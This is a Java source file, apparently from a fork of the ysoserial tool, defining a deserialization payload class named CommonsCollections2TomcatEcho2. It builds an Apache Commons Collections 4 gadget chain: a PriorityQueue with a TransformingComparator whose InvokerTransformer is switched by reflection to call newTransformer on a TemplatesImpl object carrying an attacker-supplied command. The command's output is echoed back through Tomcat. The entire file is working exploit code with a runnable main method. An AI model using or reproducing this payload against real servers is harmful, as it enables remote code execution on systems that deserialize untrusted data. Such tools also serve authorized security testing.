package ysoserial.payloads;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.util.PriorityQueue;
import java.util.Queue;

public class CommonsCollections2TomcatEcho2 extends CommonsCollections2 {
    @Override
    public Queue<Object> getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImplTomcatEcho2(command);
        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;

        return queue;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections2TomcatEcho2.class, args);
    }
}
